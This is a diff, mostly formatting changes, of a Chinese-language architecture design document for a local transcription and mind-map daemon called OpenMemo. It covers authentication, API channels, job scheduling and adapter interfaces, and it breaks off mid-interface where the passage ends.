@@ -115,12 +115,12 @@ depends_on: ADR-001, ADR-002, ADR-003, ADR-004, R-01, R-02, R-03, R-04
 
 **边界说明**
 
-| 边界 | 协议 | 谁跨过它 | 硬约束 |
-|---|---|---|---|
-| 浏览器 ↔ daemon | HTTP/1.1 over TCP，`127.0.0.1` | 所有 UI 操作 | 必须带 token（Bearer 或 cookie）；`Host`/`Origin` 白名单；同 origin 提供 SPA 静态资源 → **零 CORS 面** |
-| daemon ↔ 子进程 | `spawn` + argv 数组 + stdio 管道 / 本地 HTTP（whisper-server） | 只有 `SubprocessRunner` | `shell:false`；子进程若监听端口必须显式 `--host 127.0.0.1`（memo.ac 的 `whisper-server` 犯过 `0.0.0.0` 的错，见 R-01 §B9）|
-| daemon ↔ 磁盘 | 受管根目录 | db / media / models / backends | 所有路径经 realpath 后必须落在受管根内（§8.5）|
-| daemon ↔ 外网 | HTTPS 出站 | downloader / yt-dlp / 云 LLM | 浏览器侧 CSP 禁止直连外网，**所有外网访问从 daemon 发出**，便于统一代理/日志/脱敏 |
+| 边界            | 协议                                                           | 谁跨过它                       | 硬约束                                                                                                                     |
+| --------------- | -------------------------------------------------------------- | ------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
+| 浏览器 ↔ daemon | HTTP/1.1 over TCP，`127.0.0.1`                                 | 所有 UI 操作                   | 必须带 token（Bearer 或 cookie）；`Host`/`Origin` 白名单；同 origin 提供 SPA 静态资源 → **零 CORS 面**                     |
+| daemon ↔ 子进程 | `spawn` + argv 数组 + stdio 管道 / 本地 HTTP（whisper-server） | 只有 `SubprocessRunner`        | `shell:false`；子进程若监听端口必须显式 `--host 127.0.0.1`（memo.ac 的 `whisper-server` 犯过 `0.0.0.0` 的错，见 R-01 §B9） |
+| daemon ↔ 磁盘   | 受管根目录                                                     | db / media / models / backends | 所有路径经 realpath 后必须落在受管根内（§8.5）                                                                             |
+| daemon ↔ 外网   | HTTPS 出站                                                     | downloader / yt-dlp / 云 LLM   | 浏览器侧 CSP 禁止直连外网，**所有外网访问从 daemon 发出**，便于统一代理/日志/脱敏                                          |
 
 ### 1.2 daemon 目录切分（给 T-011 建骨架用）
 
@@ -155,6 +155,7 @@ apps/daemon/src/
 
 > **此前这棵树写着 `domain/`、`search/`、`events/`、`subprocess/`、`adapters/`、`logging/` 六个目录，
 > 以及 `http/{sse,ws,media,static}/` 四个子目录 —— 这 10 项都不存在**（20 项里 10 项，50%）。落地时的实际去向：
+>
 > - `http/sse`、`http/ws`、`http/media`、`http/static` 各是**一个文件**（`sse.ts` / `ws.ts` / `media.ts` / `static.ts`），不是目录；
 > - `search/` 落在 `http/rest/search.ts`；
 > - `events/` 落在 `jobs/events.ts`；
@@ -177,11 +178,11 @@ apps/daemon/src/
 
 ### 2.1 启动方式（三条入口，同一份逻辑）
 
-| 入口 | 场景 | 行为 |
-|---|---|---|
-| **A. 双击图标**（主路径） | 普通用户 | 安装器在桌面/开始菜单/Launchpad 放一个壳：macOS 是最小 `.app`（`Contents/MacOS/openmemo` 直接是启动脚本）、Windows 是 `openmemo.exe` 或 `.lnk`、Linux 是 `.desktop`。行为 = `openmemo up --open`：若已在跑则**不再起第二个**，直接打开浏览器指向已有实例 |
-| **B. CLI** | 开发者 / 排障 | `openmemo up [--port N] [--no-open] [--data-dir P]` · `down` · `status` · `open` · `logs` · `doctor` |
-| **C. 开机自启** | 常驻用户，**默认关闭**，设置页开关 | macOS: `~/Library/LaunchAgents/ac.openmemo.daemon.plist`（`RunAtLoad`+`KeepAlive`）；Windows: **计划任务**（登录时触发，比 Run 注册表键更可控、可设延迟与重启策略）；Linux: `~/.config/systemd/user/openmemo.service`（`Restart=on-failure`, `RestartSec=5`）|
+| 入口                      | 场景                               | 行为                                                                                                                                                                                                                                                          |
+| ------------------------- | ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **A. 双击图标**（主路径） | 普通用户                           | 安装器在桌面/开始菜单/Launchpad 放一个壳：macOS 是最小 `.app`（`Contents/MacOS/openmemo` 直接是启动脚本）、Windows 是 `openmemo.exe` 或 `.lnk`、Linux 是 `.desktop`。行为 = `openmemo up --open`：若已在跑则**不再起第二个**，直接打开浏览器指向已有实例      |
+| **B. CLI**                | 开发者 / 排障                      | `openmemo up [--port N] [--no-open] [--data-dir P]` · `down` · `status` · `open` · `logs` · `doctor`                                                                                                                                                          |
+| **C. 开机自启**           | 常驻用户，**默认关闭**，设置页开关 | macOS: `~/Library/LaunchAgents/ac.openmemo.daemon.plist`（`RunAtLoad`+`KeepAlive`）；Windows: **计划任务**（登录时触发，比 Run 注册表键更可控、可设延迟与重启策略）；Linux: `~/.config/systemd/user/openmemo.service`（`Restart=on-failure`, `RestartSec=5`） |
 
 **`up` 的完整流程**
 
@@ -221,11 +222,18 @@ apps/daemon/src/
 `runtime.json`（`0600`，随进程创建/删除）只是**元数据 sidecar**：
 
 ```jsonc
-{ "schema": 1, "app": "openmemo", "version": "0.1.0",
-  "pid": 12345, "instanceId": "01J…ULID", "startedAt": "…",
-  "host": "127.0.0.1", "port": 17650,
-  "token": "<base64url-32B>",           // 0600 保护
-  "dataDir": "/home/u/.local/share/openmemo" }
+{
+  "schema": 1,
+  "app": "openmemo",
+  "version": "0.1.0",
+  "pid": 12345,
+  "instanceId": "01J…ULID",
+  "startedAt": "…",
+  "host": "127.0.0.1",
+  "port": 17650,
+  "token": "<base64url-32B>", // 0600 保护
+  "dataDir": "/home/u/.local/share/openmemo",
+}
 ```
 
 - 判定"已有实例"必须**同时**满足：端口被占 **且** `/api/health` 返回我们的应用标识 **且** 其 `dataDir` 与本次请求的一致。
@@ -247,6 +255,7 @@ fragment 不会被发送到服务器（不进 access log）、不会出现在 `R
 （我们自己是服务器，本来也不会泄露，但**浏览器扩展、代理、崩溃报告器**读 URL 是现实风险面。）
 
 **前端拿到后**：
+
 1. `history.replaceState(null,'','/')` 立刻抹掉 fragment（防 URL 被截图/分享/进历史记录）。
 2. `POST /api/auth/session`，`Authorization: Bearer <token>` →
    daemon 校验后 `Set-Cookie: om_sid=<新随机 sid>; HttpOnly; SameSite=Strict; Path=/; Max-Age=…`
@@ -255,12 +264,12 @@ fragment 不会被发送到服务器（不进 access log）、不会出现在 `R
 
 **为什么必须换成 cookie（这是技术强制，不是偏好）**：
 
-| 通道 | 能否带自定义 header |
-|---|---|
-| `fetch()` REST | ✅ 能 |
-| `EventSource`（SSE） | ❌ **不能**（规范不支持自定义 header） |
-| `WebSocket`（浏览器 API） | ❌ **不能**（除 `Sec-WebSocket-Protocol` 的 hack） |
-| `<audio src>` / `<video src>` / `<img src>` | ❌ **不能** |
+| 通道                                        | 能否带自定义 header                                |
+| ------------------------------------------- | -------------------------------------------------- |
+| `fetch()` REST                              | ✅ 能                                              |
+| `EventSource`（SSE）                        | ❌ **不能**（规范不支持自定义 header）             |
+| `WebSocket`（浏览器 API）                   | ❌ **不能**（除 `Sec-WebSocket-Protocol` 的 hack） |
+| `<audio src>` / `<video src>` / `<img src>` | ❌ **不能**                                        |
 
 → 把 token 塞 query 参数是常见做法但会进日志；**cookie 是唯一同时覆盖这四类的方案**。
 代价是引入 CSRF 面，用 §8.2 的 Host/Origin/SameSite/双提交四重防护对冲。
@@ -295,11 +304,11 @@ T+15s  仍未退出 → process.exit(1)（硬超时，防止挂死）
 
 启动时读 `PRAGMA user_version`：
 
-| 情况 | 行为 |
-|---|---|
-| `user_version < 代码支持` | 备份（`VACUUM INTO backups/…`）→ 逐个迁移，每个迁移一个事务 |
-| `user_version == 代码支持` | 直接用 |
-| `user_version > 代码支持` | **拒绝启动**，返回明确错误："数据库由更新版本的 OpenMemo 创建（v{db} > v{app}），请升级应用或从 `backups/` 恢复。" 绝不尝试"尽力而为"地打开——那会静默损坏数据 |
+| 情况                       | 行为                                                                                                                                                          |
+| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `user_version < 代码支持`  | 备份（`VACUUM INTO backups/…`）→ 逐个迁移，每个迁移一个事务                                                                                                   |
+| `user_version == 代码支持` | 直接用                                                                                                                                                        |
+| `user_version > 代码支持`  | **拒绝启动**，返回明确错误："数据库由更新版本的 OpenMemo 创建（v{db} > v{app}），请升级应用或从 `backups/` 恢复。" 绝不尝试"尽力而为"地打开——那会静默损坏数据 |
 
 细节见 D-02 §5。
 
@@ -321,6 +330,7 @@ T+15s  仍未退出 → process.exit(1)（硬超时，防止挂死）
 无法读到进程启动时间的平台（回退方案）：只在 pid 存活 **且** 该 pid 的可执行路径落在我们的受管 `bin/` 目录内时才 kill `[设计]`。
 
 **C. 孤儿文件 GC**
+
 - `tmp/` 每次启动整目录清空。
 - `media/` 中不被任何 `media_assets` 行引用的文件 → 移入 `tmp/orphans/`，保留 7 天再删（不直接删，防误判）。
 - `.partial` / `.partial.json` 由 downloader 自己认领（R-04 §6.3 已定）。
@@ -344,13 +354,13 @@ SSE `EventSource` 自带重连；断线期间的事件通过 `Last-Event-ID` 从
 
 ### 3.1 前缀分配（架构级命名空间，请 T-013 认领并细化）
 
-| 前缀 | 通道 | 承担什么 | 不承担什么 |
-|---|---|---|---|
-| `/api/**` | REST / JSON | **短请求**：资源 CRUD、动作触发（返回 jobId）、查询、配置读写 | 长轮询、大文件、流式输出 |
-| `/api/events` | **SSE（全局唯一一条）** | **所有**服务端→客户端的异步通知：任务进度、下载进度、转写增量、LLM 流式 token、硬件/后端状态变更、日志尾巴 | 客户端→服务端（SSE 是单向的） |
-| `/ws/**` | WebSocket | **仅两种**双向低延迟场景：① `/ws/recorder` 浏览器麦克风音频上行 + 实时转写下行（F3）；② `/ws/asr-worker` 浏览器作为 WebGPU ASR worker 的反向通道 —— ⚠️ **v1 不实现**（ADR-006 决策 3 已降为实验特性；`apps/daemon/src/http/ws.ts` 认得这个路由但**直接拒握手**）。当前实际只有 ① | 任何能用 REST+SSE 表达的东西 |
-| `/media/**` | HTTP 字节流 | 音视频回放（**必须支持 Range**）、波形数据、缩略图、导出文件下载 | JSON |
-| `/` `/assets/**` | 静态 | SPA 产物 | — |
+| 前缀             | 通道                    | 承担什么                                                                                                                                                                                                                                                                         | 不承担什么                    |
+| ---------------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------- |
+| `/api/**`        | REST / JSON             | **短请求**：资源 CRUD、动作触发（返回 jobId）、查询、配置读写                                                                                                                                                                                                                    | 长轮询、大文件、流式输出      |
+| `/api/events`    | **SSE（全局唯一一条）** | **所有**服务端→客户端的异步通知：任务进度、下载进度、转写增量、LLM 流式 token、硬件/后端状态变更、日志尾巴                                                                                                                                                                       | 客户端→服务端（SSE 是单向的） |
+| `/ws/**`         | WebSocket               | **仅两种**双向低延迟场景：① `/ws/recorder` 浏览器麦克风音频上行 + 实时转写下行（F3）；② `/ws/asr-worker` 浏览器作为 WebGPU ASR worker 的反向通道 —— ⚠️ **v1 不实现**（ADR-006 决策 3 已降为实验特性；`apps/daemon/src/http/ws.ts` 认得这个路由但**直接拒握手**）。当前实际只有 ① | 任何能用 REST+SSE 表达的东西  |
+| `/media/**`      | HTTP 字节流             | 音视频回放（**必须支持 Range**）、波形数据、缩略图、导出文件下载                                                                                                                                                                                                                 | JSON                          |
+| `/` `/assets/**` | 静态                    | SPA 产物                                                                                                                                                                                                                                                                         | —                             |
 
 **为什么 `/media/**` 必须独立于 REST**：`<audio>`/`<video>` 元素由浏览器发起请求，不经过我们的 fetch 封装 → 不能带 header（靠 cookie 鉴权）、必须支持 `Range`/`206`/`Accept-Ranges`/`If-Range`、需要不同的缓存头（`Cache-Control: private, max-age=…` + 强 ETag）、绝不能走 JSON 序列化。把它混进 `/api` 会污染 REST 的中间件栈（body parser、日志、错误信封全都不适用）。
 
@@ -393,13 +403,13 @@ data: {"type":"job.progress","ts":"2026-08-02T…","topic":"job:01J…",
 
 **订正留痕**（ADR-007 决策 6 要求：写明原设计 + 订正原因，否则后人无法判断是深思熟虑还是随手改）：
 
-| | 内容 |
-|---|---|
-| **原设计** | 嵌套式 `data: {type, ts, topic, payload:{…}}` —— 业务字段包在 `payload` 里 |
-| **现裁定** | **扁平**：`data: {type, ts, topic, ...业务字段}` |
-| **为什么改** | `packages/shared` 的实现与 D-05 的前端设计**都是扁平**，D-01 是唯一的嵌套。三处对齐时改一处成本最低（ADR-010 决策 2）。 |
+|                  | 内容                                                                                                                                                                                                     |
+| ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **原设计**       | 嵌套式 `data: {type, ts, topic, payload:{…}}` —— 业务字段包在 `payload` 里                                                                                                                               |
+| **现裁定**       | **扁平**：`data: {type, ts, topic, ...业务字段}`                                                                                                                                                         |
+| **为什么改**     | `packages/shared` 的实现与 D-05 的前端设计**都是扁平**，D-01 是唯一的嵌套。三处对齐时改一处成本最低（ADR-010 决策 2）。                                                                                  |
 | **技术上也更好** | 扁平让 `SseEvent` 成为一个**可判别联合**（discriminated union，按 `type` 收窄），TS 能直接窄化到具体 payload 类型；嵌套则需要额外的泛型参数 `SseEvent<T>` 才能表达同样的东西，且每个消费点都要多解一层。 |
-| **代价** | 信封字段（`type`/`ts`/`topic`）与业务字段共享命名空间 → **业务字段不得叫这三个名字**。已在 shared 的类型里由 `SseEventBase` 约束住。 |
+| **代价**         | 信封字段（`type`/`ts`/`topic`）与业务字段共享命名空间 → **业务字段不得叫这三个名字**。已在 shared 的类型里由 `SseEventBase` 约束住。                                                                     |
 
 - **主题命名**：`域.动作[.阶段]`，如 `job.created` / `job.progress` / `job.done` / `job.failed` /
   `download.progress` / `transcribe.segment` / `mindmap.delta` / `hardware.changed` / `backend.installed` / `daemon.shutdown`。
@@ -414,9 +424,9 @@ data: {"type":"job.progress","ts":"2026-08-02T…","topic":"job:01J…",
 
 ### 3.4 WebSocket：只给真正需要双向的场景
 
-| 端点 | 方向 | 载荷 |
-|---|---|---|
-| `/ws/recorder` | 上行：二进制音频帧（PCM16 16kHz 单声道，20~100ms 一帧）；下行：JSON `{partial|final, segment}` | F3 实时录音转写 |
+| 端点             | 方向                                                                                   | 载荷                                                        |
+| ---------------- | -------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
+| `/ws/recorder`   | 上行：二进制音频帧（PCM16 16kHz 单声道，20~100ms 一帧）；下行：JSON `{partial          | final, segment}`                                            | F3 实时录音转写 |
 | `/ws/asr-worker` | 下行：`{chunkId, audioUrl, modelId, params}`；上行：`{chunkId, segments[] , progress}` | 浏览器 WebGPU 作为 ASR worker（§6.1 L0）—— ⚠️ **v1 不实现** |
 
 > ⚠️ **`/ws/asr-worker` 这一行是保留的协议设计，不是当前行为。** 按 **ADR-006 决策 3** 它已降级为实验特性、
@@ -424,6 +434,7 @@ data: {"type":"job.progress","ts":"2026-08-02T…","topic":"job:01J…",
 > 本文 TL;DR 第 3 行早已说"已降为实验特性"，**此前 §3.1 与本表没跟着同步**，看上去像个可用端点。
 
 约束：
+
 - 二进制帧走 `ArrayBuffer`，控制消息走 JSON 文本帧，**不混编**。
 - 鉴权：握手时校验 cookie + `Origin`（WebSocket **不受 SameSite 完全保护**，必须显式校验 `Origin`，否则任意网页可发起跨源 WS —— 这是 WS 的经典坑）。
 - **背压**：上行音频若积压超过 3 秒，daemon 主动丢最老的帧并下发 `overrun` 警告（实时转写宁可丢也不能无限缓冲把内存吃爆）。
@@ -434,13 +445,20 @@ data: {"type":"job.progress","ts":"2026-08-02T…","topic":"job:01J…",
 - **错误信封** —— **【2026-08-02 订正：以 `packages/shared` 的实现为准】**
 
   本文原提议 RFC 9457 `application/problem+json`；`model-mgmt` 在 T-013 实现的是：
+
   ```ts
   // packages/shared/src/api.ts（已落地）
   interface ApiErrorBody {
-    error: { code: string; message: string; messageZh: string;
-             retryable: boolean; details?: unknown }
+    error: {
+      code: string;
+      message: string;
+      messageZh: string;
+      retryable: boolean;
+      details?: unknown;
+    };
   }
   ```
+
   **采用实现版本**，`code` 仍是稳定字符串（前端按它做 i18n 与动作，见 D-05 §5.2/§6.2）。
 
   ✅ **`remediation` 已补入**：`packages/shared/src/api.ts:272` 现有
@@ -448,6 +466,7 @@ data: {"type":"job.progress","ts":"2026-08-02T…","topic":"job:01J…",
   `{error:{code,message,messageZh,retryable,remediation}}`），由 **ADR-007 决策 2 批准**。
   它不是锦上添花 —— **章程要求 2.1「用户不碰命令行」直接依赖它**。
   ⚠️ **此前这一段写着"但缺一个字段：原设计的 `remediation: {action, params}` 没有对应物…该文件归 `model-mgmt` 独占，需 Manager 协调" —— 已补，无需协调**（D-05 §8 差异 2 同步关闭）。
+
 - **版本化**：路径前缀 `/api`（**订正**：原写 `/api/v1`；实现无版本段）。
   版本职责由 `packages/shared` 的 `CONTRACT_VERSION` 承担 —— 前端启动时比对，不匹配则阻断并提示刷新。
   破坏性变更升 `CONTRACT_VERSION`；只有在需要新旧并存时才引入路径版本段。
@@ -485,14 +504,14 @@ Job（用户可见）        "导入 https://… 并转写"
               └── blocked ──(依赖满足)────────┘
 ```
 
-| 状态 | 含义 | 谁能转出 |
-|---|---|---|
-| `queued` | 等待 lane 空槽 | 调度器 |
-| `blocked` | **缺前置条件**（模型未装 / 后端未装 / 磁盘不足 / 未配 API Key），带 `blocked_code` + `remediation` | 条件满足事件 或 用户操作 |
-| `leased` | 已分配 worker，尚未真正开始（短暂） | worker |
-| `running` | 执行中，持续续租 | worker / 用户 |
-| `paused` | 用户暂停或 daemon 优雅退出，**checkpoint 完好** | 用户 resume |
-| `succeeded` / `failed` / `cancelled` | 终态 | — |
+| 状态                                 | 含义                                                                                               | 谁能转出                 |
+| ------------------------------------ | -------------------------------------------------------------------------------------------------- | ------------------------ |
+| `queued`                             | 等待 lane 空槽                                                                                     | 调度器                   |
+| `blocked`                            | **缺前置条件**（模型未装 / 后端未装 / 磁盘不足 / 未配 API Key），带 `blocked_code` + `remediation` | 条件满足事件 或 用户操作 |
+| `leased`                             | 已分配 worker，尚未真正开始（短暂）                                                                | worker                   |
+| `running`                            | 执行中，持续续租                                                                                   | worker / 用户            |
+| `paused`                             | 用户暂停或 daemon 优雅退出，**checkpoint 完好**                                                    | 用户 resume              |
+| `succeeded` / `failed` / `cancelled` | 终态                                                                                               | —                        |
 
 `blocked` 是产品级重要状态：memo.ac 在缺后端时直接失败并报一段英文错误；我们让它变成一个**可点击修复**的等待态。
 
@@ -500,14 +519,14 @@ Job（用户可见）        "导入 https://… 并转写"
 
 不设"全局并发数"（那是错的抽象——下载和 GPU 推理抢的根本不是同一种资源），改为**按资源类别的信号量池**，每个 step 声明它占用哪个 lane：
 
-| lane | 默认并发 | 依据 | 说明 |
-|---|---|---|---|
-| `net.download` | 2 | 家用带宽 | 单个下载内部再分 4 片（R-04 §6.3 已定，不抄 Ollama 的 16） |
-| `net.llm` | 2 | 云 API 速率 | 可在设置里调；本地 llama 走 `gpu.llm` 而非这里 |
-| `cpu.media` | `clamp(cores/4, 1, 4)` | ffmpeg 自己会吃多核 | 转码/抽音轨/波形 |
-| `gpu.asr` | **1** | **显存不可超卖** | whisper/sherpa 推理。即使 CPU 后端也保持 1，避免线程互相踩踏 |
-| `gpu.llm` | **1** | 同上 | 本地 llama-server；与 `gpu.asr` **互斥**（见下） |
-| `io.local` | 4 | 磁盘 | 文件拷贝、哈希、解压、索引写入 |
+| lane           | 默认并发               | 依据                | 说明                                                         |
+| -------------- | ---------------------- | ------------------- | ------------------------------------------------------------ |
+| `net.download` | 2                      | 家用带宽            | 单个下载内部再分 4 片（R-04 §6.3 已定，不抄 Ollama 的 16）   |
+| `net.llm`      | 2                      | 云 API 速率         | 可在设置里调；本地 llama 走 `gpu.llm` 而非这里               |
+| `cpu.media`    | `clamp(cores/4, 1, 4)` | ffmpeg 自己会吃多核 | 转码/抽音轨/波形                                             |
+| `gpu.asr`      | **1**                  | **显存不可超卖**    | whisper/sherpa 推理。即使 CPU 后端也保持 1，避免线程互相踩踏 |
+| `gpu.llm`      | **1**                  | 同上                | 本地 llama-server；与 `gpu.asr` **互斥**（见下）             |
+| `io.local`     | 4                      | 磁盘                | 文件拷贝、哈希、解压、索引写入                               |
 
 - **`gpu.asr` 与 `gpu.llm` 互斥**：同一块卡上同时跑 whisper large 和 8B LLM 会 OOM。用一个更粗的 `gpu.exclusive` 信号量（并发 1）把两者串起来 `[设计]`。若探测到多 GPU，按 `device_index` 分池 `[设计，未验证]`。
 - lane 容量随硬件探测结果**动态调整**（`hardware.changed` 事件触发重算）。
@@ -517,12 +536,12 @@ Job（用户可见）        "导入 https://… 并转写"
 
 `priority INTEGER`（小 = 先跑）：
 
-| 值 | 语义 |
-|---|---|
-| 0 | **交互式**：用户当前正在看的笔记触发的操作（点"重新转写这一段"、录音实时流） |
-| 10 | 普通：单个导入 |
-| 20 | 批量：一次拖入 50 个文件 / RSS 批量订阅 |
-| 30 | 后台维护：索引重建、缩略图补齐、GC |
+| 值  | 语义                                                                         |
+| --- | ---------------------------------------------------------------------------- |
+| 0   | **交互式**：用户当前正在看的笔记触发的操作（点"重新转写这一段"、录音实时流） |
+| 10  | 普通：单个导入                                                               |
+| 20  | 批量：一次拖入 50 个文件 / RSS 批量订阅                                      |
+| 30  | 后台维护：索引重建、缩略图补齐、GC                                           |
 
 - 调度顺序：`state='queued' AND next_run_at<=now AND blocked=0` → `ORDER BY priority ASC, created_at ASC`。
 - **前台自动提优先级**：前端在打开某笔记时发 `POST /api/notes/{uid}/focus`，daemon 把该笔记未完成的 job 的 `priority` 临时降到 0。这是很小的实现成本换很大的体感提升。
@@ -530,12 +549,12 @@ Job（用户可见）        "导入 https://… 并转写"
 
 ### 4.4 暂停 / 取消 `[设计]`
 
-| 操作 | 机制 | 子进程 | checkpoint |
-|---|---|---|---|
-| **暂停** | `paused=1` → worker 在 chunk 边界停 | `SIGTERM`（宽限 5s→`SIGKILL`） | **保留**，`resume` 从下一 chunk 继续 |
-| **软取消**（默认） | `cancel_requested=1` → 同上 | 同上 | 丢弃；已落库的部分结果**保留**并标记 `partial`（用户能看到已转写的部分，不做全有全无） |
-| **硬取消**（用户点"立即停止"） | 立即 `SIGKILL` 进程组 | 立即 | 丢弃当前 chunk |
-| **删除笔记** | 级联取消其所有 job | 同硬取消 | 全部清理 + 文件 GC |
+| 操作                           | 机制                                | 子进程                         | checkpoint                                                                             |
+| ------------------------------ | ----------------------------------- | ------------------------------ | -------------------------------------------------------------------------------------- |
+| **暂停**                       | `paused=1` → worker 在 chunk 边界停 | `SIGTERM`（宽限 5s→`SIGKILL`） | **保留**，`resume` 从下一 chunk 继续                                                   |
+| **软取消**（默认）             | `cancel_requested=1` → 同上         | 同上                           | 丢弃；已落库的部分结果**保留**并标记 `partial`（用户能看到已转写的部分，不做全有全无） |
+| **硬取消**（用户点"立即停止"） | 立即 `SIGKILL` 进程组               | 立即                           | 丢弃当前 chunk                                                                         |
+| **删除笔记**                   | 级联取消其所有 job                  | 同硬取消                       | 全部清理 + 文件 GC                                                                     |
 
 - **取消必须是可见的**：置位后 200ms 内 SSE 推 `job.cancelling`，UI 立刻变灰，不让用户以为没点上。
 - **下载的取消保留 `.partial`**（R-04 §8.7 已定），下次 pull 续传。
@@ -557,12 +576,12 @@ Job（用户可见）        "导入 https://… 并转写"
 
 ### 4.7 重试策略
 
-| 错误类别 | 例子 | 重试 |
-|---|---|---|
-| 瞬时 | 网络超时、5xx、连接重置、`EBUSY` | ✅ 指数退避 `min(2^n × 2s, 5min)`，max 5 次，带 ±20% 抖动 |
-| 资源不足 | 磁盘满、显存 OOM | ⚠️ 转 `blocked`，不盲目重试；OOM 时**自动降级重试一次**（换更小量化 / 换 CPU 后端）并告知用户 |
-| 永久 | 404/403、格式不支持、SHA256 不符、参数非法 | ❌ 直接 `failed`，给 remediation |
-| 已知反爬 | yt-dlp 返回需要登录/年龄验证 | ❌ `failed` + remediation="使用浏览器 cookie" 或 "改用本地文件导入" |
+| 错误类别 | 例子                                       | 重试                                                                                          |
+| -------- | ------------------------------------------ | --------------------------------------------------------------------------------------------- |
+| 瞬时     | 网络超时、5xx、连接重置、`EBUSY`           | ✅ 指数退避 `min(2^n × 2s, 5min)`，max 5 次，带 ±20% 抖动                                     |
+| 资源不足 | 磁盘满、显存 OOM                           | ⚠️ 转 `blocked`，不盲目重试；OOM 时**自动降级重试一次**（换更小量化 / 换 CPU 后端）并告知用户 |
+| 永久     | 404/403、格式不支持、SHA256 不符、参数非法 | ❌ 直接 `failed`，给 remediation                                                              |
+| 已知反爬 | yt-dlp 返回需要登录/年龄验证               | ❌ `failed` + remediation="使用浏览器 cookie" 或 "改用本地文件导入"                           |
 
 ---
 
@@ -636,6 +655,7 @@ sequenceDiagram
 ```
 
 **关键点**
+
 - `probe` 与 `fetch` 分成两个 yt-dlp 调用：先拿元数据（秒级）就能让 UI 立刻显示标题/时长/封面，用户不用盯着空白等；也让"格式不支持/需要登录"这类失败**提前**暴露。
 - 只抽音轨（`-vn`），不下整段视频，除非用户勾选"保留视频"。这能省掉绝大部分带宽与磁盘。
 - 转写用 **16kHz / 单声道 / PCM16** —— whisper.cpp 与 sherpa 的原生输入格式，避免它们内部再转一次。
@@ -676,6 +696,7 @@ sequenceDiagram
 ```
 
 **关键点**
+
 - **为什么要分块上传而不是一次 `multipart/form-data`**：用户会拖 2GB 的会议录像。一次性上传无法显示进度、无法续传、且 Node 的 body parser 会把它缓冲进内存。分块 + 直接写盘是唯一可行解。
 - **"文件已在本地为什么还要上传"**：因为浏览器沙箱拿不到文件路径。**例外**：提供一个"从磁盘路径导入"入口（用户手输/粘贴路径，或未来 Tauri 外壳提供原生选择器），走 `POST /import/path`，但该路径必须经 §8.5 的受管根校验或用户显式授权目录白名单 `[设计]`。
 - 已是标准格式则**跳过转码**——ffprobe 一次就能判定，省掉大文件的一次全量重写。
@@ -724,6 +745,7 @@ sequenceDiagram
 ```
 
 **关键点**
+
 - **partial 不落库**，只有 final 段落进 DB。否则 DB 会被高频半成品写爆，且 undo 语义混乱。
 - **双写**：ASR 走裸 PCM（低延迟），存档走 `MediaRecorder` 压缩流（省空间）。二者时间基准用同一个 `performance.now()` 起点对齐 `[设计，未验证时钟漂移量]`。
 - **两阶段转写**（流式 → 离线重跑）是产品质量的关键：流式模型（zipformer/paraformer streaming）延迟低但准确率明显低于 whisper large。录完自动重跑一遍，用户既得到了实时反馈，又得到了高质量最终稿。**重跑结果覆盖时保留用户已做的编辑**（按段落 diff，只覆盖未编辑段）`[设计]`。
@@ -773,6 +795,7 @@ sequenceDiagram
 ```
 
 **关键点**
+
 - **LLM 必须走强制结构化输出**（JSON Schema / tool call），不要让它吐 Markdown 再解析——R-01 §A2.4 记录 memo.ac 自陈"72B 以下模型思维导图转换有问题"，本质就是自由文本解析太脆。
 - **每个节点携带 `refs`（时间区间）** 是我们相对 memo.ac 的关键差异：点导图节点能跳到音频对应位置（F5 联动）。要做到这点，喂给 LLM 的每段文本前必须带 `[mm:ss]` 标记，并要求它在输出里回填 `startMs/endMs`。回填不可信 → daemon 侧用**文本相似度回溯匹配**到实际 segment 校正 `[设计，未验证匹配准确率]`。
 - **PATCH 发操作而非全量**：一张几百节点的导图全量 PUT 会让"谁改了什么"不可追踪，且与 LLM 增量生成冲突。
@@ -820,6 +843,7 @@ sequenceDiagram
 ```
 
 **关键点**
+
 - **波形必须预计算**（`role=peaks` 的二进制 asset）。在浏览器里 `decodeAudioData` 一个 2 小时的文件会占几百 MB 内存并卡死主线程。
 - **区间查找用二分而非线性扫描**：一场 3 小时讲座可能有 3000+ 段，每帧线性扫会掉帧。
 - **搜索结果直达时间点**是 F5 的杀手级体验，也是"转写稿 ↔ 时间轴"数据结构的最终检验标准（D-02 §3）。
@@ -834,14 +858,15 @@ sequenceDiagram
 ```ts
 // 设计示意；实际类型定义位置见各小节标注
 interface Adapter {
-  readonly id: string;                    // 稳定标识，进 DB/设置
+  readonly id: string; // 稳定标识，进 DB/设置
   readonly kind: 'asr' | 'llm' | 'mindmap-render' | 'media-source';
-  capabilities(): Promise<Capabilities>;  // 运行时探测，可能变化
+  capabilities(): Promise<Capabilities>; // 运行时探测，可能变化
   isAvailable(): Promise<AvailabilityStatus>; // {ok} | {missing, remediation}
 }
 ```
 
 **共同硬规则**（ADR-001 §配套 2：禁止第三方 API 泄漏到业务代码）：
+
 - 业务代码只能 import 适配层接口，**不得 import 任何第三方 ASR/LLM/渲染库**。这是**约定（尚未机器强制）**。⚠️ **此前写着"CI 用 `eslint no-restricted-imports` 强制（规则清单交 T-011/T-012 落地）" —— `eslint.config.js` 里没有这条规则**；该文件里的 `no-restricted-imports` 只有三处（`:64`/`:86`/`:104`），全是 D-05 §3.5 的前端分层护栏（`features/A` 不得 import `features/B`、`lib/`+`components/` 不得依赖 `features/`），与 ASR/LLM/渲染库无关。
 - 适配层的**数据结构必须是我们自己的**（`TranscriptSegment`、`MindMapDoc`…），不得直接透传上游的结构体。
 
@@ -851,26 +876,31 @@ interface Adapter {
 interface AsrEngine extends Adapter {
   capabilities(): Promise<{
     modes: ('batch' | 'stream')[];
-    backends: BackendId[];            // cuda|vulkan|rocm|metal|coreml|cpu|webgpu
+    backends: BackendId[]; // cuda|vulkan|rocm|metal|coreml|cpu|webgpu
     languages: string[] | 'auto';
     wordTimestamps: boolean;
     diarization: boolean;
     maxAudioSeconds?: number;
   }>;
   transcribeChunk(req: {
-    audioPath: string; offsetMs: number; durationMs: number;
-    modelId: string; language?: string; prompt?: string;
-    signal: AbortSignal; onProgress(p: number): void;
-  }): Promise<TranscriptSegment[]>;              // batch
-  openStream(req: StreamReq): AsrStream;         // stream: write(pcm) / on('partial'|'final')
+    audioPath: string;
+    offsetMs: number;
